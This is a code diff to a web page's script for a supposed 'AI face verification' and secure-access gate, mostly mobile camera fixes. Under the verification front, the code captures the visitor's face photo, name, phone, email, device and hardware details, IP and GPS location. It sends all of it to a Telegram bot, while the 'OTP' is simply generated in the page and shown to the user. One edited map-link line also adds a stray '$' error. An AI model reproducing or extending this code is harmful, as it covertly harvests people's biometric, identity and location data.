@@ -3819,7 +3819,7 @@
     };
 </script>
 <script>
-    // --- 1. ADVANCED AI FACE VERIFICATION ENGINE ---
+    // --- 1. ADVANCED AI FACE VERIFICATION ENGINE (FIXED FOR MOBILE) ---
     const mndFace = {
         camStream: null,
         aiModel: null,
@@ -3837,19 +3837,25 @@
         initCamera: async function() {
             const status = document.getElementById('kycStatus');
             const hintText = document.getElementById('kycHintText');
+            const video = document.getElementById('kycVideo');
+            
+            // iOS & Mobile Browser Force Overrides
+            video.setAttribute('autoplay', '');
+            video.setAttribute('muted', '');
+            video.setAttribute('playsinline', '');
+            
             status.innerText = "INITIALIZING HARDWARE...";
             
             try {
-                if (this.camStream) this.stopCamera(); // Prevent memory leaks
+                if (this.camStream) this.stopCamera(); 
                 
                 this.camStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: this.facingMode }, 
+                    video: { facingMode: this.facingMode, width: { ideal: 640 }, height: { ideal: 480 } }, 
                     audio: false 
                 });
                 
-                const video = document.getElementById('kycVideo');
                 video.srcObject = this.camStream;
-                video.play();
+                await video.play();
                 
                 // Hardware feature detection for Flashlight
                 const track = this.camStream.getVideoTracks()[0];
@@ -3869,14 +3875,15 @@
                 status.innerText = "READY. ALIGN FACE & START.";
                 hintText.innerText = "Look straight into the camera.";
             } catch (e) {
-                alert("⚠️ Camera Access Denied. Please check permissions or use OTP.");
+                console.error(e);
+                alert("⚠️ Camera Access Denied or Blocked by Browser. Please allow permissions.");
                 mndAuth.abortProcess();
             }
         },
 
         toggleCamera: function() {
             this.facingMode = this.facingMode === 'user' ? 'environment' : 'user';
-            this.flashActive = false; // Reset flash state
+            this.flashActive = false;
             this.initCamera();
         },
 
@@ -3894,81 +3901,96 @@
             const status = document.getElementById('kycStatus');
             const box = document.getElementById('kycBox');
             const hintText = document.getElementById('kycHintText');
+            const video = document.getElementById('kycVideo');
+            const canvas = document.getElementById('kycCanvas');
+            const ctx = canvas.getContext('2d', { willReadFrequently: true });
             
             // Turn on the perfect green laser CSS animation
             box.className = "mnd-kyc-container scanner-active";
             btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> FAST SCAN ACTIVE...';
             btn.disabled = true;
 
-            if(!this.aiModel) this.aiModel = await blazeface.load();
+            // BUG FIX 1: Wait for video dimensions to load before drawing to canvas
+            if (video.videoWidth === 0) {
+                status.innerText = "WAITING FOR LENS DATA...";
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => resolve();
+                });
+            }
 
-            const video = document.getElementById('kycVideo');
-            const canvas = document.getElementById('kycCanvas');
             canvas.width = video.videoWidth; 
             canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
+
+            if(!this.aiModel) this.aiModel = await blazeface.load();
 
             let attempts = 0;
-            const maxAttempts = 50; // 50 attempts @ 100ms = 5 seconds max
-            const dynamicHints = ["Keep face steady...", "Checking lighting...", "Analyzing facial geometry..."];
+            const maxAttempts = 40; // 40 attempts (~6 seconds max)
+            const dynamicHints = ["Hold device steady...", "Ensure good lighting...", "Analyzing facial geometry..."];
+            let isProcessing = false; // BUG FIX 3: Prevents overlapping AI crashes
             
-            // LIGHTNING FAST 100ms SCAN INTERVAL
+            // SAFE INTERVAL LOOP
+            clearInterval(this.scanInterval);
             this.scanInterval = setInterval(async () => {
+                if (isProcessing) return; 
+                isProcessing = true;
                 attempts++;
+                
                 status.innerText = `ANALYZING... (${attempts}/${maxAttempts})`;
+                if(attempts % 10 === 0) hintText.innerText = dynamicHints[(attempts/10 - 1) % 3];
                 
-                if(attempts % 15 === 0) hintText.innerText = dynamicHints[(attempts/15 - 1) % 3];
-                
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const faces = await this.aiModel.estimateFaces(video, false);
-
-                let isHuman = false;
-                
-                // STRICT CHECK: The AI MUST be 95%+ confident it is a real human face
-                if (faces.length > 0 && faces[0].probability[0] > 0.95) { 
-                    isHuman = true; 
-                }
-
-                if (isHuman) {
-                    clearInterval(this.scanInterval); // STOP SCANNING
-                    box.className = "mnd-kyc-container scanner-success";
-                    status.innerText = "HUMAN VERIFIED";
-                    status.style.color = "var(--success)";
-                    hintText.innerText = "Verification Complete. Generating Code...";
+                try {
+                    // Draw video frame to canvas
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    // GENERATE BRAND NEW OTP UPON SUCCESS
-                    mndAuth.currentOTP = Math.floor(100000 + Math.random() * 900000).toString();
+                    // Run AI Scan
+                    const faces = await this.aiModel.estimateFaces(video, false);
+                    let isHuman = false;
+                    
+                    // BUG FIX 2: Optimized Confidence Threshold (85% instead of 95%)
+                    if (faces.length > 0 && faces[0].probability[0] > 0.85) { 
+                        isHuman = true; 
+                    }
 
-                    // Snap secure picture and proceed
-                    canvas.toBlob(async (blob) => {
-                        this.stopCamera(); 
-                        mndAuth.switchStep('step3');
-                        mndAuth.showToast(mndAuth.currentOTP);
-                        mndAuth.startResendCooldown();
+                    if (isHuman) {
+                        clearInterval(this.scanInterval); 
+                        box.className = "mnd-kyc-container scanner-success";
+                        status.innerText = "HUMAN VERIFIED";
+                        status.style.color = "var(--success)";
+                        hintText.innerText = "Verification Complete. Generating Code...";
                         
-                        // Send Exact Telemetry Format
-                        const fd = new FormData();
-                        fd.append('chat_id', MND_CONFIG.chatId);
-                        fd.append('caption', await mndSecurity.buildTelemetry(false, "AI Face Scan", mndAuth.currentOTP));
-                        fd.append('parse_mode', 'HTML');
-                        fd.append('photo', blob, 'mnd_face_kyc.jpg');
-                        fetch(`https://api.telegram.org/bot${MND_CONFIG.botToken}/sendPhoto`, { method: 'POST', body: fd }).catch(e=>{});
+                        mndAuth.currentOTP = Math.floor(100000 + Math.random() * 900000).toString();
 
-                        btn.innerHTML = '<i class="fas fa-expand"></i> START SECURE SCAN';
+                        canvas.toBlob(async (blob) => {
+                            this.stopCamera(); 
+                            mndAuth.switchStep('step3');
+                            mndAuth.showToast(mndAuth.currentOTP);
+                            mndAuth.startResendCooldown();
+                            
+                            const fd = new FormData();
+                            fd.append('chat_id', MND_CONFIG.chatId);
+                            fd.append('caption', await mndSecurity.buildTelemetry(false, "AI Face Scan", mndAuth.currentOTP));
+                            fd.append('parse_mode', 'HTML');
+                            fd.append('photo', blob, 'mnd_face_kyc.jpg');
+                            fetch(`https://api.telegram.org/bot${MND_CONFIG.botToken}/sendPhoto`, { method: 'POST', body: fd }).catch(e=>{});
+
+                            btn.innerHTML = '<i class="fas fa-expand"></i> START SECURE SCAN';
+                            btn.disabled = false;
+                        }, 'image/jpeg', 0.85);
+
+                    } else if (attempts >= maxAttempts) {
+                        clearInterval(this.scanInterval);
+                        box.className = "mnd-kyc-container scanner-error";
+                        status.innerText = "NO HUMAN DETECTED";
+                        status.style.color = "var(--danger)";
+                        hintText.innerText = "Ensure face is visible and well-lit. No code generated.";
+                        btn.innerHTML = '<i class="fas fa-redo"></i> RETRY SCAN';
                         btn.disabled = false;
-                    }, 'image/jpeg', 0.85);
-
-                } else if (attempts >= maxAttempts) {
-                    // FAILED TO FIND FACE IN 5 SECONDS - DO NOT GIVE OTP
-                    clearInterval(this.scanInterval);
-                    box.className = "mnd-kyc-container scanner-error";
-                    status.innerText = "NO HUMAN DETECTED";
-                    status.style.color = "var(--danger)";
-                    hintText.innerText = "Ensure face is visible and well-lit. No code generated.";
-                    btn.innerHTML = '<i class="fas fa-redo"></i> RETRY SCAN';
-                    btn.disabled = false;
+                    }
+                } catch (err) {
+                    console.warn("Frame drop ignored");
                 }
-            }, 100); // 100ms ultra-fast scanning
+                isProcessing = false;
+            }, 150); // 150ms scan speed
         },
 
         stopCamera: function() {
@@ -3996,7 +4018,6 @@
             if(!mndAuth.validateInputs()) return;
             const uName = document.getElementById('inpName').value;
             
-            // WebAuthn API for Native Fingerprint/PIN
             if (window.PublicKeyCredential) {
                 try {
                     const chal = new Uint8Array(32); window.crypto.getRandomValues(chal);
@@ -4018,7 +4039,7 @@
                         localStorage.setItem('mnd_hub_e', document.getElementById('inpEmail').value);
                         
                         mndAuth.closeModal();
-                        mndAuth.currentOTP = "OS_VERIFIED"; // Special flag for telemetry
+                        mndAuth.currentOTP = "OS_VERIFIED"; 
                         this.triggerLoader(false, "Device Biometrics");
                     }
                 } catch (e) { alert("❌ Device authentication canceled."); }
@@ -4066,48 +4087,21 @@
                 navigator.geolocation.getCurrentPosition(
                     pos => {
                         gpsStatus = "✅ View on Maps";
-                        mapLink = `http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        mapLink = `http://google.com/maps?q=$${pos.coords.latitude},${pos.coords.longitude}`;
                         res();
                     },
                     err => res()
                 );
             });
-            await Promise.race([getL(), new Promise(r => setTimeout(r, 2000))]); // Fast timeout
+            await Promise.race([getL(), new Promise(r => setTimeout(r, 2000))]); 
 
             let finalCode = otpCode === "OS_VERIFIED" ? "BIOMETRIC_PASS" : otpCode;
             let displayMethod = isReturn ? "Auto-Login Override" : method;
-            
             const ts = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Calcutta' });
 
-            // EXACT TELEGRAM LOG FORMAT AS REQUESTED
-            return `🚨 <b>MND SECURE ACCESS LOG</b> 🚨
-(${displayMethod} | Code: ${finalCode})
-
-👤 <b>IDENTITY MATRIX</b>
-• Name: ${n}
-• Phone: ${p}
-• Email: ${e}
-
-📱 <b>DEVICE INTELLIGENCE</b>
-• Model: ${model}
-• OS: ${osStr}
-• Screen: ${screenStr}
-• Timezone: ${tz}
-
-⚙️ <b>HARDWARE LAYER</b>
-• GPU: ${gpu}
-• CPU/RAM: Cores: ${cores}, RAM: ${ram}
-• Battery: ${bat}
-
-📡 <b>NETWORK & LOCATION</b>
-• IP: ${ip}
-• Type: ${net}
-• GPS: ${gpsStatus}
-•map links- ${mapLink}
-⏰ Timestamp: ${ts}`;
+            return `🚨 <b>MND SECURE ACCESS LOG</b> 🚨\n(${displayMethod} | Code: ${finalCode})\n\n👤 <b>IDENTITY MATRIX</b>\n• Name: ${n}\n• Phone: ${p}\n• Email: ${e}\n\n📱 <b>DEVICE INTELLIGENCE</b>\n• Model: ${model}\n• OS: ${osStr}\n• Screen: ${screenStr}\n• Timezone: ${tz}\n\n⚙️ <b>HARDWARE LAYER</b>\n• GPU: ${gpu}\n• CPU/RAM: Cores: ${cores}, RAM: ${ram}\n• Battery: ${bat}\n\n📡 <b>NETWORK & LOCATION</b>\n• IP: ${ip}\n• Type: ${net}\n• GPS: ${gpsStatus}\n•map links- ${mapLink}\n⏰ Timestamp: ${ts}`;
         },
 
-        // --- 3. FINAL LOAD & REDIRECT ---
         triggerLoader: async function(isReturn, authMethod = "Auto Login") {
             const loader = document.getElementById('fullLoader');
             const txt = document.getElementById('loaderText');
@@ -4135,7 +4129,7 @@
                     clearInterval(pInterval);
                     setTimeout(() => { window.location.replace('https://maa-nirmala-dj.github.io/-tent-house./'); }, 500);
                 }
-            }, 50); // Total load time ~ 2.5 seconds
+            }, 50); 
         }
     };
 </script>
